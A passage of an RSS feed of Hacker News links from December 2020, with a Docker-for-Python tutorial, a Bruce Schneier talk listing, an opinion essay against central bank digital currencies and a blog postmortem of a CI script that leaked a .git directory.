music; a movie buff should build better Rotten Tomatos. Etc.</p> </article></div>]]>
            </description>
            <link>https://dcgross.com/a-new-google</link>
            <guid isPermaLink="false">hacker-news-small-sites-25552030</guid>
            <pubDate>Sun, 27 Dec 2020 16:23:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Docker and Python]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25551892">thread link</a>) | @jajjarax
<br/>
December 27, 2020 | https://matteoguadrini.github.io/posts/containerized-python-development/ | <a href="https://web.archive.org/web/*/https://matteoguadrini.github.io/posts/containerized-python-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" id="main">
        

<div>
  <div>
    <p>Containerized Python Development</p>
  </div>
  
</div>
<article>
  
  <section>
    <p><img src="https://i.morioh.com/9ccb7b143f.png" alt="docker and python"></p>

<p>When we develop more than one python project, we need to configure our development environment with the dependencies of all the projects. This becomes even more complicated when there are many people on the development of the project.
To do this, you need to create a development environment that is isolated from the others. We can do this thanks to <strong>docker</strong> containers.</p>
<h2 id="prepare-project">Prepare project</h2>
<p>Let‚Äôs imagine that our project has this structure:</p>
<pre><code data-lang="console">pydk
‚îú‚îÄ‚îÄ‚îÄ requirements.txt
‚îî‚îÄ‚îÄ‚îÄ src
     ‚îî‚îÄ‚îÄ‚îÄ server.py
</code></pre><p>We now think that our project may depend on some external libraries, such as <strong>Flask</strong>. Let‚Äôs prepare a file called <em>requirements.txt</em> with a line inside it: <code>Flask==1.1.2</code></p>
<p>While our <em>server.py</em> application, it will be a simple Flask application like the following:</p>
<div><pre><code data-lang="python"><span>from</span> <span>flask</span> <span>import</span> <span>Flask</span>
<span>server</span> <span>=</span> <span>Flask</span><span>(</span><span>__name__</span><span>)</span>

<span>@server.route</span><span>(</span><span>"/"</span><span>)</span>
<span>def</span> <span>hello_docker</span><span>():</span>
    <span>return</span> <span>"Hello docker!"</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
   <span>server</span><span>.</span><span>run</span><span>(</span><span>host</span><span>=</span><span>'0.0.0.0'</span><span>)</span>
</code></pre></div><p>Now, we can run and continue to develop this project locally, but if we had other projects with requirements that would conflict, we would break this or other projects.
So, let‚Äôs see how we can isolate this project inside a container that is the same for all the developers who are going to develop.</p>
<h2 id="prepare-dockerfile">Prepare dockerfile</h2>
<p>Now we need to create a <em>Dockerfile</em> (<code>pydk/Dockerfile</code>) that contains suitable instructions to build our container so that it can execute our python code.</p>
<div><pre><code data-lang="dockerfile"><span># base image</span><span>
</span><span></span><span>FROM</span><span> python:3.9</span><span>
</span><span>
</span><span></span><span># working directory in the container</span><span>
</span><span></span><span>WORKDIR</span><span> /pydk</span><span>
</span><span>
</span><span></span><span># copy the dependencies file to the working directory</span><span>
</span><span></span><span>COPY</span> requirements.txt .<span>
</span><span>
</span><span></span><span># install dependencies</span><span>
</span><span></span><span>RUN</span> pip install -r requirements.txt<span>
</span><span>
</span><span></span><span># copy the content of the local src directory to the working directory</span><span>
</span><span></span><span>COPY</span> src/ .<span>
</span><span>
</span><span></span><span># command to run on container start</span><span>
</span><span></span><span>CMD</span> <span>[</span> <span>"python"</span><span>,</span> <span>"./server.py"</span> <span>]</span><span>
</span></code></pre></div><p>Now we run the command to build our image. When docker builder kicks in, you can see all the steps we wrote in our dockerfile:</p>
<pre><code data-lang="console">$ docker build -t mypy .
Sending build context to Docker daemon  4.608kB
Step 1/6 : FROM python:3.9
3.9: Pulling from library/python
6c33745f49b4: Pull complete 
ef072fc32a84: Pull complete 
c0afb8e68e0b: Pull complete 
d599c07d28e6: Pull complete 
f2ecc74db11a: Pull complete 
26856d31ce86: Pull complete 
a463ae07b5f3: Pull complete 
54f24c50f14e: Pull complete 
168ee6df05fe: Pull complete 
Digest: sha256:39c16d1a064c0239939d4ed52923b736c25b389e6ea439d5652b8fc9564ede76
Status: Downloaded newer image for python:3.9
 ---&gt; d1eef6fb8dbe
Step 2/6 : WORKDIR /pydk
 ---&gt; Running in ab2f8923ad12
Removing intermediate container ab2f8923ad12
 ---&gt; bad3fb87e418
Step 3/6 : COPY requirements.txt .
 ---&gt; eade175d7095
Step 4/6 : RUN pip install -r requirements.txt
 ---&gt; Running in de2b7fcd2c6d
Collecting Flask==1.1.2
  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB)
Collecting click&gt;=5.1
  Downloading click-7.1.2-py2.py3-none-any.whl (82 kB)
Collecting itsdangerous&gt;=0.24
  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)
Collecting Jinja2&gt;=2.10.1
  Downloading Jinja2-2.11.2-py2.py3-none-any.whl (125 kB)
Collecting MarkupSafe&gt;=0.23
  Downloading MarkupSafe-1.1.1.tar.gz (19 kB)
Collecting Werkzeug&gt;=0.15
  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)
Building wheels for collected packages: MarkupSafe
  Building wheel for MarkupSafe (setup.py): started
  Building wheel for MarkupSafe (setup.py): finished with status 'done'
  Created wheel for MarkupSafe: filename=MarkupSafe-1.1.1-cp39-cp39-linux_x86_64.whl size=32240 sha256=6fbda6c15fe2abefc6c8f4ec2ac66c421b1cf997c1a53a532a39bbebc8083860
  Stored in directory: /root/.cache/pip/wheels/e0/19/6f/6ba857621f50dc08e084312746ed3ebc14211ba30037d5e44e
Successfully built MarkupSafe
Installing collected packages: MarkupSafe, Werkzeug, Jinja2, itsdangerous, click, Flask
Successfully installed Flask-1.1.2 Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 click-7.1.2 itsdangerous-1.1.0
Removing intermediate container de2b7fcd2c6d
 ---&gt; 595ceaa19d29
Step 5/6 : COPY src/ .
 ---&gt; 98294355a272
Step 6/6 : CMD [ "python", "./server.py" ]
 ---&gt; Running in 1fb2a61f97ce
Removing intermediate container 1fb2a61f97ce
 ---&gt; 09fd1053a1c1
Successfully built 09fd1053a1c1
Successfully tagged mypy:latest
</code></pre><p>Let‚Äôs check the newly created image.</p>
<pre><code data-lang="console">$ docker images
REPOSITORY                         TAG                 IMAGE ID            CREATED             SIZE
mypy                               latest              09fd1053a1c1        15 minutes ago      896MB
python                             3.9                 d1eef6fb8dbe        8 days ago          885MB
</code></pre><h2 id="test-flask-on-docker">Test Flask on docker</h2>
<p>Now we can launch our image and test our application.</p>
<pre><code data-lang="console">$ docker run -d -p 5000:5000 mypy
487c215ec0cc2b44c1612c0aadbd3f1f47c32a0b29273da3dabf77351717852c

$ docker ps
CONTAINER ID        IMAGE               COMMAND                CREATED             STATUS              PORTS                    NAMES
487c215ec0cc        mypy                "python ./server.py"   28 seconds ago      Up 27 seconds       0.0.0.0:5000-&gt;5000/tcp   crazy_hermann

$ curl http://localhost:5000
Hello docker!
</code></pre><h2 id="conclusion">Conclusion</h2>
<p>We have created a small development environment for <strong>python</strong> application. Now, we can connect to our image and continue the development of the application without affecting our local environment.</p>

  </section>

  
</article>

      </div></div>]]>
            </description>
            <link>https://matteoguadrini.github.io/posts/containerized-python-development/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25551892</guid>
            <pubDate>Sun, 27 Dec 2020 16:04:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Conversation with Bruce Schneier [video]]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25551599">thread link</a>) | @sasvari
<br/>
December 27, 2020 | https://media.ccc.de/v/rc3-11473-conversation_with_bruce_schneier | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11473-conversation_with_bruce_schneier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=Bruce+Schneier">Bruce Schneier</a> and
<a href="https://media.ccc.de/search?p=frank">frank</a>

</p><p>
No content found (yet?).
</p>
<!-- %h3 About -->
<p>Live Conversation with Bruce Schneier. Audience questions can be submitted via chat and have a chance to be asked by moderator Frank Rieger.</p>

<p>Topics:
<br>‚Ä¢ Actual and perceived role of cryptography in our world
<br>‚Ä¢ The recent latest chapter in the eternal CryptoWars
<br>‚Ä¢ Core problems of IT-security and why nobody solves them
<br>‚Ä¢ The digital sphere as a freefire battlefield for state and nonstate actors
<br>‚Ä¢ Technological, legal and political leverages to prevent total surveillance</p>

<h3>Download</h3>

<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11473-conversation_with_bruce_schneier</link>
            <guid isPermaLink="false">hacker-news-small-sites-25551599</guid>
            <pubDate>Sun, 27 Dec 2020 15:21:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Central Bank Digital Currencies Are a Bad Idea]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 165 (<a href="https://news.ycombinator.com/item?id=25550443">thread link</a>) | @simonebrunozzi
<br/>
December 27, 2020 | https://www.forgac.me/blog/2020/11/17/three-reasons-why-central-bank-digital-currencies-are-a-bad-idea | <a href="https://web.archive.org/web/*/https://www.forgac.me/blog/2020/11/17/three-reasons-why-central-bank-digital-currencies-are-a-bad-idea">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1605643941671" id="item-5fb42c70669e655a2de5be01"><div><div><div data-block-type="2" id="block-36140108062efd62704e"><div><p><em>This text was published at </em><a href="https://mises.org/wire/why-central-bank-digital-currencies-are-bad-idea"><em>Mises Institute</em></a></p><p>The Central Banking Digital Currencies (CBDC) are being sold with the narrative of protecting consumers who are increasingly moving to cashless payments and as a result, robbing themselves of the privacy advantages of cash and exposing themselves to bank runs, payment network blackouts, and to foreign financial adversaries.</p><p>While these risks are real, they would be negligible had it not been for the central banking and financial regulators‚Äô interventions into the market (more on that in the last couple of paragraphs), and CBDCs if anything make them worse and introduce some new, much bigger ones.</p><p>While the stated intention behind their design is to keep the commercial banks in the picture, CBDCs will bring the end-users of the future tokens closer to the central banks. This is because blockchains and blockchain-inspired distributed ledger technologies are built on a single, common, ledger, which is distributed either in a permissionless or permissioned manner. The permissionless distribution exposes a lot of information about the network participants, but in combination with proof-of-work verification makes it very difficult for an adversary to attack and overtake the network and e.g. change the inflation rate.</p><p>Permissioned network with no proof-of-work or similar consensus algorithm not only doesn‚Äôt provide the immutability feature but by having a single permissioned ledger gives potential control to those who grant the network privileges. As a result, the central bank as the ultimate permission issuer would have much stronger control over the monetary system and payment network than they have right now. This gives the central banks three very dangerous capabilities.</p><h2>Helicopter Money</h2><p>The reason why we‚Äôve seen such an elevated business cycle over the past century is the central banking fiat money system. Unnatural expansion of the money supply causes booms, which are unsustainable and markets try to clear them when they are exposed as such.</p><p>Economists of the Austrian school understand, that the boom is the real problem and the economic crisis is the necessary and positive cleansing mechanism. Unfortunately, the (neo)Keynesian response to such an event is to prop the markets up by further monetary interventions.</p><p>However, the current design of the banking system requires the intermediary role of commercial banks in issuing credit to businesses. Central banks get frustrated when the commercial banks exercise caution in an economy, which hasn‚Äôt fully cleared the previous misallocations and hasn‚Äôt brought prices of capital goods to more sustainable levels.</p><p>Furthermore, since the predominant Keynesian narrative is that spending drives the economy (hint: it doesn‚Äôt - capital investments do), the central banks would like to spur more consumer spending by issuing money supply directly to consumers. Needless to say, commercial banks‚Äô cautious approach to consumer credit in a period of growing unemployment doesn‚Äôt align well with the central bank‚Äôs goals either. During the COVID crisis, the governments managed to an extent to get around these hurdles by issuing benefits en masse, but those are complicated by logistics, bureaucracy, or legislation.</p><p>By closer integration of the monetary spigot to the end consumers and businesses, the central bank can much more easily issue credit, or just outright cashouts to the private individuals and commercial entities by simply ‚Äúairdropping‚Äù new tokens to the existing token identities. They would not even compromise their stated intention of keeping the commercial banks in the picture - those would still serve as custodians of the token keys, and even have the ability to issue credit along the traditional lines.</p><p>This would lead to disastrous consequences. Economies get easily addicted to central banks‚Äô money dope. With every new crisis, the chief monetarists had to increase intervention doses the same way as junkies have to do with their drug of choice. As with every addiction, the longer it lasts and the stronger it grows, the more difficult it is to cure it. And while monetary overdose such as we‚Äôve seen in Zimbabwe or Venezuela might not come for a long time, if ever, junkies don‚Äôt perform well, as Japan‚Äôs three lost decades of BOJ‚Äôs interventions have demonstrated.</p><h2>Negative Interest Rates</h2><p>Hoarding is evil - or so the modern monetarists‚Äô narrative goes. In the Keynesian framework, there is no space for the function of cash as a hedge in times of uncertainty. Savings accounts, in their minds, are just money that doesn‚Äôt work in spurring the miracles of spending- and monetary-driven economic growth. Negative interest rates are then potentially the most effective method of preventing hoarding by incentivizing account holders to spend their depreciating balances.</p><p>Currently, the central banks have to rely on commercial banks to pass the negative interest rates on their customers. Commercial banks instead are trying to convince the account holders to move their deposits from negative yielding accounts to interest yielding products and are consuming the negative rates on most of the outstanding cash balances.</p><p>With the central bank tokens being tied more tightly with their issuance authority, it would be much easier for the monetary interventionists to impose negative interest rates on all tokens in circulation. This would on a margin certainly increase the consumers‚Äô and businesses‚Äô propensity to spend and would also drive asset prices up as people would try to offload their cash savings. But to think of it as something beneficial is foolish. It was massive spending, record-low savings, and unsustainable asset valuations that led to the credit bubbles and crises of the past decades. To think that more of the same recipe would lead to a different, let alone better outcome is ludicrous.</p><h2>Financial Surveillance</h2><p>Third and final major implication of cash tokenization is the potential it creates for financial surveillance. The central banks are ostensibly introducing digital tokens to protect people‚Äôs privacy in the face of those reducing their anonymous cash usage. But the idea that any branch of government, let alone the one that imposes KYC/AML rules on the existing crypto token platforms, limits physical cash use to prevent tax avoidance, and uses financial surveillance to catch non-violent ‚Äúcriminals‚Äù cares about our privacy is laughable.</p><p>They‚Äôre not even hiding the fact, that tokenization of money would allow them to run what they call ‚Äúdata analytics‚Äù, but to think that they would not make the leap from aggregate analytics to individual data processing would be naive.</p><p>Of course, it‚Äôs not a coincidence, that China is the global leader in CBDCs. The surveillance potential of centralized tokenization is extremely attractive to the government that tries to keep tabs on every aspect of the lives of their underlings.</p><p>The proponents of the central banking tokens argue, that consumers need to be protected against targeted attacks on a country‚Äôs payment network. While such a risk exists - for example, if a country like Switzerland tried to provide anonymity for foreign depositors as it used to and as a result Visa and Mastercard would be pressured to shut down their payment networks for the country - if it materializes, the economy can always temporarily revert back to cash, supported by a vast network of local ATMs and bank branches.</p><p>If anything, the biggest attacks on the monetary exchange in the western world came from the governments themselves suspending or limiting cash withdrawals in times of liquidity crises as was the case in Cyprus or Greece, not to mention that those crises themselves were caused by central banking credit bubbles of the preceding periods.</p><p>Finally as was already mentioned, the argument about the protection of consumer privacy doesn‚Äôt pass the laugh test considering the history of continuous erosion of financial privacy by central banks and financial regulators.</p><p>In conclusion, the same characteristics for which people should oppose the transition to CDBCs give central banks the strongest reason to champion and implement them. And while the pretense of an investigation into the fiat money tokenization gives an impression of a debate on the topic, the reality is, there will be no debate and the digital currencies will go through and give central banks more control than they had before with all the disastrous consequences such control brings.</p></div></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.forgac.me/blog/2020/11/17/three-reasons-why-central-bank-digital-currencies-are-a-bad-idea</link>
            <guid isPermaLink="false">hacker-news-small-sites-25550443</guid>
            <pubDate>Sun, 27 Dec 2020 11:57:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When Failures Align]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25549949">thread link</a>) | @luu
<br/>
December 27, 2020 | https://reeshill.net/posts/shell-ci-fail/ | <a href="https://web.archive.org/web/*/https://reeshill.net/posts/shell-ci-fail/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>Yesterday, this site went down for about four hours. Complaints started rolling
in from my millions of ardent followers, spurring me into action. Join
me as I deconstruct what went wrong, how I fixed it, and how I tried to
prevent the problem from occurring again.</p>

<p>This site is built with <a href="https://gohugo.io/">Hugo</a>, a static site generator
written in Go.
It<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> uses a slightly modified version of the
<a href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme by
<a href="https://github.com/LordMathis">Mat√∫≈° N√°me≈°n√Ω</a>.
It‚Äôs deployed automatically using GitLab‚Äôs CI/CD (Continuous
Integration/Continuous Deployment) service. Every time I push a commit to the
remote repository, a server runs a deployment script that I wrote. The script
generates the site and then uploads it to my web host.</p>
<p>Since I got the flow working, I didn‚Äôt have any problems until now.</p>

<p>Yesterday at 8:22pm, I pushed a benign commit to the remote repository.
The commit in question simply removed a draft of a post I had been writing
and decided not to publish. As with all pushed commits, this triggered a
build and push of the site.</p>
<p>Hours later, I went to my site for something and noticed something strange:
the homepage was 404ing. So were all the other pages that should have
been there. So I looked through my CI logs and found that:</p>
<ol>
<li>Hugo had failed to build my site</li>
<li>My script attempted to upload anyway</li>
<li><em>It uploaded my <code>.git</code> directory</em></li>
</ol>
<p>The first one is okay; failures happen even though ideally they wouldn‚Äôt.
The second one is worrying: Why would that happen?
The third one had the potential to be disastrous.</p>
<h2 id="the-consequences">The consequences</h2>
<p>Luckily for me, there were few consequences. To my knowledge, my site gets very
few visitors. Also, it‚Äôs not like my site runs important tools or services for me,
since it‚Äôs a static site.</p>
<p>However, there is one thing that could have been very bad‚Ä¶</p>
<h2 id="the-potential-consequences">The potential consequences</h2>
<p>As I mentioned above, for those four hours, my entire <code>.git</code> directory for the
repository that holds this site was available for all to browse at
<a href="https://reeshill.net/.git/">https://reeshill.net/.git/</a>. This of course means that not only was the current
state of the repository publicly accessible, all past version history was as well.</p>
<p>My CI script needs to authenticate with my web host to upload the generated site.
It does this with an app-specific password. For the script, this password needs
to be stored somewhere the CI server will have access to.
The na√Øve solution would be to hard-code the password into the script that runs
on CI. If I had done this, <em>even if I had later removed it</em>, the password would
exist in the history of the repository. Had this been the case, an attacker
would have had plenty of time to discover this in the version history and upload
malicious content to my web host, such as a Javascript cryptocurrency miner.</p>
<p>Fortunately, Past Me was smart enough not to put any secrets in version control.
The password is actually stored by GitLab and given to the CI server as an
environment variable. I trust GitLab a lot more than I trust myself to keep my
secrets safe.</p>

<p>Two big things went wrong at once to cause this failure. If either of them had
gone right, the damage would have been either nonexistent or extremely minimal.
But because they both managed to fail at once, the consequences were greater.</p>

<p>The immediate cause of failure was that Hugo installation started failing.
I was using a Docker image of Alpine Linux that contained
<a href="https://en.wikipedia.org/wiki/Lftp"><code>lftp</code></a>, which I use as an FTP client.
However, that image did not contain Hugo, and when I set it up I was afraid to
mess with it, so CI would install Hugo from the network every time it was run.
Something must have changed in the Alpine repositories, because suddenly
running <code>hugo</code> resulted in the error</p>
<pre><code>Error relocating /usr/bin/hugo: _ZNSt7__cxx1118basic_stringstreamIcSt11char_traitsIcESaIcEEC1Ev: symbol not found
</code></pre>
<p>This should have been no big deal. The CI should have failed and then I would
deal with fixing the Hugo installation. But because of problem #2, the whole
situation spiraled out of control.</p>
<h2 id="the-real-cause">The real cause</h2>
<p>When I wrote the script that builds and uploads the site in April 2018, I did not
yet understand how shell scripting works. Crucially, I didn‚Äôt understand exit
codes. When you run a shell command, part of the result is an exit code: a
number which is <code>0</code> if the command was successful and some other value if it
failed.</p>
<p>By default, a script that contains a sequence of commands will run all of those
commands in order, even if one or more command fails. For an example, see the
following script:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>The second command (the <code>ls</code>) will fail if the named directory does not exist.
But the script will keep running. Here‚Äôs the output from running the above script:</p>
<pre><code>$ ./steamroll.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
The exit code of the previous command was 1
</code></pre><p>The second <code>echo</code> runs despite the previous command failing with a nonzero
exit code.</p>
<p>That‚Äôs kind of scary! In most programming languages, if the program encounters
an error, it will crash or display some sort of exception that halts execution.
Because the default shell behavior is to keep going regardless of failure status,
my script failed to generate the site but proceeded to the next step anyway.</p>
<p>In my case, when <code>lftp</code> was unable to upload the directory it was supposed to
upload (which was a child of the current directory), it instead uploaded the
current directory, which was the repository root. That looked like this:</p>
<pre><code>/builds/jarhill0/homepage/public: No such file or directory
Transferring file `README.md'
Transferring file `ci-upload.sh'
Transferring file `config.toml'
Making directory `.git'
Transferring file `.git/FETCH_HEAD'
Transferring file `.git/HEAD'
[etc.]
</code></pre><p>Ultimately, the failure of my script to halt once a command failed was what led
to the incident. Small failures should be expected, but when they happen there
should be a clear indication of failure and the process should not continue.</p>

<p>There were essentially three problems I had to fix:</p>
<ol>
<li>My site was down</li>
<li>My builds weren‚Äôt failing</li>
<li>My builds <em>were</em> failing</li>
</ol>
<h2 id="the-quick-fix">The quick fix</h2>
<p>Since I was still able to build my website on my local machine, I did that and
uploaded it. That gave me time to fix the underlying problems.</p>
<h2 id="the-process-fix">The process fix</h2>
<p>If one of my builds didn‚Äôt succeed, that should be reflected in the script‚Äôs
exit status.</p>
<p>It took six characters to fix my script:</p>
<p>Adding this line towards the top of the script does the following, according
to the <a href="http://www.linuxcommand.org/lc3_man_pages/seth.html">man page for <code>set</code></a>:</p>
<pre><code>-e  Exit immediately if a command exits with a non-zero status.
</code></pre><p>That‚Äôs <em>exactly</em> what we want! As soon as a command fails, the script should
fail. With this option set, any failures that may occur down the road will
stop the CI job with a failure status. Perfect!</p>
<p>Here‚Äôs what it looks like in our test script from above:</p>
<div><pre><code data-lang="shell"><span>#!/bin/sh
</span><span></span>
<span>set</span> -e

<span>echo</span> <span>'Started the script!'</span>
ls directory-that-does-not-exist
<span>echo</span> <span>'The exit code of the previous command was'</span> <span>"</span><span>$?</span><span>"</span>
</code></pre></div><p>And the output:</p>
<pre><code>$ ./stopsign.sh 
Started the script!
ls: directory-that-does-not-exist: No such file or directory
</code></pre><p>It stopped once there was an error. Sweet!</p>
<h2 id="the-build-fix">The build fix</h2>
<p>Now that my build status was properly reflecting the failure that was occuring,
I needed to make the builds succeed.</p>
<p>A quick search didn‚Äôt help me figure out what was causing the mis-installation
of Hugo, and I didn‚Äôt feel like digging in further because I knew that I was
misusing Docker.
The whole point of Docker is that it leads to reproducible states.
Instead of installing a new dependency on top of my Docker image every time,
I should put all necessary
dependencies in the image from the beginning. So I bit the bullet and figured
out how to make (actually, adapt) a Dockerfile. Now, all of my CI builds will
start with Hugo and <code>lftp</code> already installed.
It didn‚Äôt take all that long, and now I have removed one more source of failure!</p>

<p>Some failures, like the bug in my script fixed by <code>set -e</code>, can lie dormant for
quite a while
(in my case, a year and a half) before being exposed when something else fails.
When something works reliably for a while, we don‚Äôt often think to go back
and check that it works as we expect it does. And it‚Äôs very difficult to get
everything right the first time.</p>
<p>I‚Äôm glad that this failure led to an improvement in the way I use Docker images.
And I‚Äôm glad that the script has been fixed, because now any other failures
will be caught and I will be alerted. Above all, I‚Äôm glad that things were
configured well enough in the beginning that nothing bad happened to my site.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>As of this writing. Subject to change. <a href="#fnref:1" role="doc-backlink">‚Ü©Ô∏é</a></p>
</li>
</ol>
</section>
            </div></div>]]>
            </description>
            <link>https://reeshill.net/posts/shell-ci-fail/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549949</guid>
            <pubDate>Sun, 27 Dec 2020 09:38:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NSudo ‚Äì run processes as System or TrustedInstaller]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25549914">thread link</a>) | @realpanzer
<br/>
December 27, 2020 | https://m2team.github.io/NSudo/en-us/ | <a href="https://web.archive.org/web/*/https://m2team.github.io/NSudo/en-us/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="data:image/png;base64,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